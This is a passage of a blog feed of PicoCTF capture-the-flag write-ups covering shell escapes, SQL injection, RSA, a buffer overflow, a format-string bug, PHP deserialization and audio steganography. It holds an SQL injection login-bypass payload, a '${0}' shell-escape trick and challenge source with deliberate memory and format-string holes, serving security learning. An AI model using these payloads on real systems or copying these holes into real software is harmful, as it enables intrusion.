 for (; !![];) {
 try {
 const userPsd = -parseInt(&amp;#34;length&amp;#34;) + -parseInt(&amp;#34;573XsMMHp&amp;#34;) + -parseInt(&amp;#34;innerHTML&amp;#34;) * -parseInt(&amp;#34;getElementById&amp;#34;) + -parseInt(&amp;#34;38934oMACea&amp;#34;) + parseInt(&amp;#34;value&amp;#34;) + -parseInt(&amp;#34;Incorrect!&amp;#34;) * -parseInt(&amp;#34;instantiate&amp;#34;) + parseInt(&amp;#34;arrayBuffer&amp;#34;);
 if (userPsd === oldPassword) {
 break;
 } else {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 } catch (_0x289152) {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 }
})(str_list, 970828);
let exports;
(async() =&amp;gt; {
 const tranfer_fn = tranfer_fn;
 let rpm_traffic = await fetch(&amp;#34;./qCCYI0ajpD&amp;#34;);
 let m = await WebAssembly[&amp;#34;1512517ESezaM&amp;#34;](await rpm_traffic[&amp;#34;1OsuamQ&amp;#34;]());
 let updatedEdgesById = m[&amp;#34;instance&amp;#34;];
 exports = updatedEdgesById[&amp;#34;copy_char&amp;#34;];
})();
/**
 * @return {undefined}
 */
function onButtonPress() {
 const tranfer_fn = tranfer_fn;
 let data = document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;exports&amp;#34;)[&amp;#34;924408cukzgO&amp;#34;];
 for (let i = 0; i &amp;lt; data[&amp;#34;result&amp;#34;]; i++) {
 exports[&amp;#34;1383842SQRPPf&amp;#34;](data[&amp;#34;charCodeAt&amp;#34;](i), i);
 }
 exports[&amp;#34;1383842SQRPPf&amp;#34;](0, data[&amp;#34;result&amp;#34;]);
 if (exports[&amp;#34;input&amp;#34;]() == 1) {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;418508cLDohp&amp;#34;] = &amp;#34;270328ewawLo&amp;#34;;
 } else {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;innerHTML&amp;#34;] = &amp;#34;check_flag&amp;#34;;
 }
}
;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Special &amp; Specialer</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---special--specialer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---special--specialer/</guid><description>&lt;h1 id="picoctf---special--specialer">
 PicoCTF - Special &amp;amp; Specialer
 &lt;a class="anchor" href="#picoctf---special--specialer">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這兩題都蠻有趣的，感覺打提權應該會用到，所以一起紀錄，第一題是要get shell，關於這一題我是直接看學長之前解題的WP，payload是&lt;code>${0}&lt;/code>就直接拿到shell了，詳細的原理我也不清楚，第二題比較簡單，就直接用網路的資源替換一下&lt;code>ls, cat&lt;/code>這兩個指令就拿到flag了&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>代替&lt;code>cat&lt;/code>的方法：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#66d9ef">while&lt;/span> read line; &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; echo $line;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; &lt;span style="color:#66d9ef">done&lt;/span> &amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ exec 3&amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}}&lt;/span> &lt;span style="color:#75715e"># Assign file descriptor 3 for reading&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#66d9ef">while&lt;/span> read -u &lt;span style="color:#ae81ff">3&lt;/span> line; &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; echo $line
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; &lt;span style="color:#66d9ef">done&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>&amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>代替&lt;code>ls&lt;/code>的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo */*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo * .*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ dir
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ printf &lt;span style="color:#e6db74">&amp;#39;%s\n&amp;#39;&lt;/span> *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ grep -l &lt;span style="color:#e6db74">&amp;#39;.*&amp;#39;&lt;/span> ./*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ find .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stat -c &lt;span style="color:#e6db74">&amp;#39;%s %A %n&amp;#39;&lt;/span> *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ lsattr ./*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim .
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jarv.org/posts/cat-without-cat/">Cat without cat on the commandline&lt;/a>
&lt;a href="https://ubunlog.com/en/alternativas-al-comando-ls/">Alternatives to the &amp;rsquo;ls&amp;rsquo; command to list the contents of a directory&lt;/a>&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
 PicoCTF - SQLiLite
 &lt;a class="anchor" href="#picoctf---sqlilite">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://saturn.picoctf.net:55837/">http://saturn.picoctf.net:55837/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - sqli
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;p>Payload:
&lt;code>admin' or '1'='1' -- #&lt;/code>
&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - SRA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---sra/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---sra/</guid><description>&lt;h1 id="picoctf---sra">
 PicoCTF - SRA
 &lt;a class="anchor" href="#picoctf---sra">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import getPrime, inverse, bytes_to_long
from string import ascii_letters, digits
from random import choice

pride = &amp;#34;&amp;#34;.join(choice(ascii_letters + digits) for _ in range(16))
gluttony = getPrime(128)
greed = getPrime(128)
lust = gluttony * greed
sloth = 65537
envy = inverse(sloth, (gluttony - 1) * (greed - 1))

anger = pow(bytes_to_long(pride.encode()), sloth, lust)

print(f&amp;#34;{anger = }&amp;#34;)
print(f&amp;#34;{envy = }&amp;#34;)

print(&amp;#34;vainglory?&amp;#34;)
vainglory = input(&amp;#34;&amp;gt; &amp;#34;).strip()

if vainglory == pride:
 print(&amp;#34;Conquered!&amp;#34;)
 with open(&amp;#34;/challenge/flag.txt&amp;#34;) as f:
 print(f.read())
else:
 print(&amp;#34;Hubris!&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</guid><description>&lt;h1 id="picoctf---stack-cache">
 PicoCTF - stack cache
 &lt;a class="anchor" href="#picoctf---stack-cache">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
 char buf[FLAGSIZE];
 char filler[BUFSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
 // this function is under construction
 char consideration[BUFSIZE];
 char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = &amp;#34;Enter names&amp;#34;;
	// *q = &amp;#34;Name 1&amp;#34;;
	// *r = &amp;#34;Name 2&amp;#34;;
 unsigned long *age;
	printf(&amp;#34;User information : %p %p %p %p %p %p\n&amp;#34;,demographic, location, identification, session, votes, dependents);
	printf(&amp;#34;Names of user: %p %p %p\n&amp;#34;, p,q,r);
 printf(&amp;#34;Age of user: %p\n&amp;#34;,age);
 fflush(stdout);
}

void vuln(){
 char buf[INPSIZE];
 printf(&amp;#34;Give me a string that gets you the flag\n&amp;#34;);
 gets(buf);
 printf(&amp;#34;%s\n&amp;#34;,buf);
 return;
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 printf(&amp;#34;Bye!&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</guid><description>&lt;h1 id="picoctf---stonk-market">
 PicoCTF - Stonk Market
 &lt;a class="anchor" href="#picoctf---stonk-market">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>FMT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf(&amp;#34;\nPortfolio as of &amp;#34;);
	fflush(stdout);
	system(&amp;#34;date&amp;#34;); // TODO: implement this in C
	fflush(stdout);

	printf(&amp;#34;\n\n&amp;#34;);
	Stonk *head = p-&amp;gt;head;
	if (!head) {
		printf(&amp;#34;You don&amp;#39;t own any stonks!\n&amp;#34;);
	}
	while (head) {
		printf(&amp;#34;%d shares of %s\n&amp;#34;, head-&amp;gt;shares, head-&amp;gt;symbol);
		head = head-&amp;gt;next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares &amp;lt; 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk-&amp;gt;shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i &amp;lt;= MAX_SYM_LEN; i++) {
		if (i &amp;lt; AI_symbol_len) {
			stonk-&amp;gt;symbol[i] = &amp;#39;A&amp;#39; + (rand() % 26);
		} else {
			stonk-&amp;gt;symbol[i] = &amp;#39;\0&amp;#39;;
		}
	}

	stonk-&amp;gt;next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen(&amp;#34;api&amp;#34;,&amp;#34;r&amp;#34;);
	if (!f) {
		printf(&amp;#34;Flag file not found\n&amp;#34;);
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p-&amp;gt;money;
	int shares = 0;
	Stonk *temp = NULL;
	printf(&amp;#34;Using patented AI algorithms to buy stonks\n&amp;#34;);
	while (money &amp;gt; 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp-&amp;gt;next = p-&amp;gt;head;
		p-&amp;gt;head = temp;
		money -= shares;
	}
	printf(&amp;#34;Stonks chosen\n&amp;#34;);

	char *user_buf = malloc(300 + 1);
	printf(&amp;#34;What is your API token?\n&amp;#34;);
	scanf(&amp;#34;%300s&amp;#34;, user_buf);
	printf(&amp;#34;Buying stonks with token:\n&amp;#34;);
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p-&amp;gt;money = (rand() % 2018) + 1;
	p-&amp;gt;head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p-&amp;gt;head;
	Stonk *next = NULL;
	while (current) {
		next = current-&amp;gt;next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf(&amp;#34;Memory failure\n&amp;#34;);
		exit(1);
	}

	int resp = 0;

	printf(&amp;#34;Welcome back to the trading app!\n\n&amp;#34;);
	printf(&amp;#34;What would you like to do?\n&amp;#34;);
	printf(&amp;#34;1) Buy some stonks!\n&amp;#34;);
	printf(&amp;#34;2) View my portfolio\n&amp;#34;);
	scanf(&amp;#34;%d&amp;#34;, &amp;amp;resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf(&amp;#34;Goodbye!\n&amp;#34;);

	exit(0);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
 PicoCTF - Super Serial
 &lt;a class="anchor" href="#picoctf---super-serial">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/B1I5n1pns">php unserialization&lt;/a>&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>The flag is at ../flag&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化&lt;/p>
&lt;ol>
&lt;li>
&lt;p>robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是&lt;code>sqli&lt;/code>，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且&lt;code>/admin.phps&lt;/code>沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
&lt;img src="https://hackmd.io/_uploads/BkcThh0Pn.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>index.phps
用index.phps查看source code發現有一些其他怪東西，包括&lt;code>authentication.phps&lt;/code>和&lt;code>cookie.php&lt;/code>
:::spoiler Real Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
require_once(&amp;#34;cookie.php&amp;#34;);

if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#34;pass&amp;#34;])){
 $con = new SQLite3(&amp;#34;../users.db&amp;#34;);
 $username = $_POST[&amp;#34;user&amp;#34;];
 $password = $_POST[&amp;#34;pass&amp;#34;];
 $perm_res = new permissions($username, $password);
 if ($perm_res-&amp;gt;is_guest() || $perm_res-&amp;gt;is_admin()) {
 setcookie(&amp;#34;login&amp;#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &amp;#34;/&amp;#34;);
 header(&amp;#34;Location: authentication.php&amp;#34;);
 die();
 } else {
 $msg = &amp;#39;&amp;lt;h6 class=&amp;#34;text-center&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;Invalid Login.&amp;lt;/h6&amp;gt;&amp;#39;;
 }
}
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;link href=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; integrity=&amp;#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;
&amp;lt;link href=&amp;#34;style.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
&amp;lt;script src=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&amp;#34; integrity=&amp;#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;col-sm-9 col-md-7 col-lg-5 mx-auto&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card card-signin my-5&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
 &amp;lt;h5 class=&amp;#34;card-title text-center&amp;#34;&amp;gt;Sign In&amp;lt;/h5&amp;gt;
 &amp;lt;?php if (isset($msg)) echo $msg; ?&amp;gt;
 &amp;lt;form class=&amp;#34;form-signin&amp;#34; action=&amp;#34;index.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user&amp;#34; name=&amp;#34;user&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Username&amp;#34; required autofocus&amp;gt;
 &amp;lt;label for=&amp;#34;user&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;pass&amp;#34; name=&amp;#34;pass&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Password&amp;#34; required&amp;gt;
 &amp;lt;label for=&amp;#34;pass&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;button class=&amp;#34;btn btn-lg btn-primary btn-block text-uppercase&amp;#34; type=&amp;#34;submit&amp;#34;&amp;gt;Sign in&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Surfing the Waves</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/</guid><description>&lt;h1 id="picoctf---surfing-the-waves">
 PicoCTF - Surfing the Waves
 &lt;a class="anchor" href="#picoctf---surfing-the-waves">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/117?category=4&amp;amp;page=3">Surfing the Waves&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>While you&amp;rsquo;re going through the FBI&amp;rsquo;s servers, you stumble across their incredible taste in music. One &lt;a href="https://mercury.picoctf.net/static/cf917a179937f814d966e53bb1fd4b90/main.wav">main.wav&lt;/a> you found is particularly interesting, see if you can find the flag!
Hint:&lt;/p>
&lt;ul>
&lt;li>Music is cool, but what other kinds of waves are there?&lt;/li>
&lt;li>Look deep below the surface&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---通靈">
 Exploit - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Audacity to Analyze
The sound seems quite normal but when you zoom in the audio track, it looks like something encode.
&lt;img src="https://i.imgur.com/D1H1jpU.png" alt="" />&lt;/li>
&lt;li>Read it - &lt;code>scipy.io&lt;/code>
Use &lt;code>scipy.io&lt;/code> library to read it and print the data out.
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">&amp;gt;&amp;gt;&amp;gt; from scipy.io.wavfile import read
&amp;gt;&amp;gt;&amp;gt; rate, data = read(&amp;#34;./main.wav&amp;#34;)
&amp;gt;&amp;gt;&amp;gt; print(data)
[2007 2503 2005 ... 4503 4501 7501]
&amp;gt;&amp;gt;&amp;gt; import numpy as np
&amp;gt;&amp;gt;&amp;gt; print(np.unique(data))
[1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1500 1501 1502 1503
 1504 1505 1506 1507 1508 1509 2000 2001 2002 2003 2004 2005 2006 2007
 2008 2009 2500 2501 2502 2503 2504 2505 2506 2507 2508 2509 3000 3001
 3002 3003 3004 3005 3006 3007 3008 3009 3500 3501 3502 3503 3504 3505
 3506 3507 3508 3509 4000 4001 4002 4003 4004 4005 4006 4007 4008 4009
 4500 4501 4502 4503 4504 4505 4506 4507 4508 4509 5000 5001 5002 5003
 5004 5005 5006 5007 5008 5009 5500 5501 5502 5503 5504 5505 5506 5507
 5508 5509 6000 6001 6002 6003 6004 6005 6006 6007 6008 6009 6500 6501
 6502 6503 6504 6505 6506 6507 6508 6509 7000 7001 7002 7003 7004 7005
 7006 7007 7008 7009 7500 7501 7502 7503 7504 7505 7506 7507 7508 7509
 8000 8001 8002 8003 8004 8005 8006 8007 8008 8009 8500 8501 8502 8503
 8504 8505 8506 8507 8508 8509]
&lt;/code>&lt;/pre>Seems it has some rule $\to$
&lt;code>1000 ~ 1009&lt;/code>
